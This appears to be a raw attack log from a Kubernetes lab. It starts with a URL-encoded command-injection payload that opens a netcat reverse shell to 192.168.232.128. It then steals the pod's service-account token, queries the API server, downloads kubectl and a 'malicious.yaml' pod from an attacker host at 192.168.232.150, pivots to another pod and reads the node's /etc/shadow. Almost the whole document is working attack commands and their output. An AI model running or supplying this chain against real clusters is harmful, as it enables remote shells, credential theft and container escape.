test;nc%20192.168.232.128%20%204444%20-e%20/bin/sh

python -c 'import pty; pty.spawn("/bin/sh")'

# env
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_PORT=443
API_SERVICE_PORT=80
API_PORT=tcp://10.107.192.61:80
WEB_LB_SERVICE_HOST=10.108.128.64
HOSTNAME=api-65577cf94b-f24d4
PYTHON_PIP_VERSION=18.1
SHLVL=3
HOME=/root
OLDPWD=/root
API_PORT_80_TCP_ADDR=10.107.192.61
WEB_LB_SERVICE_PORT=80
WEB_LB_PORT=tcp://10.108.128.64:80
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
API_PORT_80_TCP_PORT=80
API_PORT_80_TCP_PROTO=tcp
WERKZEUG_SERVER_FD=3
WEB_LB_PORT_80_TCP_ADDR=10.108.128.64
WEB_LB_PORT_80_TCP_PORT=80
WERKZEUG_RUN_MAIN=true
API_PORT_80_TCP=tcp://10.107.192.61:80
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
WEB_LB_PORT_80_TCP_PROTO=tcp
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
LANG=C.UTF-8
WEB_LB_PORT_80_TCP=tcp://10.108.128.64:80
PYTHON_VERSION=3.6.6
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_HOST=10.96.0.1
API_SERVICE_HOST=10.107.192.61
PWD=/root

# mount | grep 'kubernetes'
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=3118548k,inode64)

# cat cgroup
12:rdma:/
11:cpuset:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
10:freezer:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
9:perf_event:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa8519fa71ae433de01b2c34bdf06885b91786d622.scope
8:memory:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
7:net_cls,net_prio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
6:devices:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
5:cpu,cpuacct:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
4:pids:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
3:blkio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
2:hugetlb:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
1:name=systemd:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope
0::/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod8704c8c8_3256_4f39_bdc9_e932598815f4.slice/docker-212f0a65323fae3ccacc0fa18519fa71ae433de01b2c34bdf06885b91786d622.scope

# export TOKEN=`cat /run/secrets/kubernetes.io/serviceaccount/token`
# wget https://10.96.0.1/api/v1/namespaces/default/pods --header="Authorization: Bearer $TOKEN" --no-check-certificate -O pods.txt
# wget http://192.168.232.150:8000/kubectl
# kubectl auth can-i list pods 
# kubectl auth can-i create pods   

./kubectl get pods
NAME                    READY   STATUS    RESTARTS   AGE
api-65577cf94b-hrrhw    1/1     Running   0          6m33s
api-65577cf94b-wvq7c    1/1     Running   0          6m33s
webapp-6996d4d7-lbq2b   1/1     Running   0          6m33s
webapp-6996d4d7-rtbdw   1/1     Running   0          6m33s

# ./kubectl get nodes
NAME      STATUS   ROLES                  AGE    VERSION
ubuntu    Ready    control-plane,master   2d3h   v1.22.1
worker1   Ready    <none>                 2d3h   v1.22.1

now we are pivoting attack method to other pod from the api pod
# ./kubectl exec -it webapp-6996d4d7-lbq2b sh

# wget http://192.168.232.150:8000/malicious.yaml

# ./kubectl apply -f malicious.yaml
# ./kubectl exec -it attacker sh
# cat /attacker/etc/hostname
# cat /attacker/etc/shadow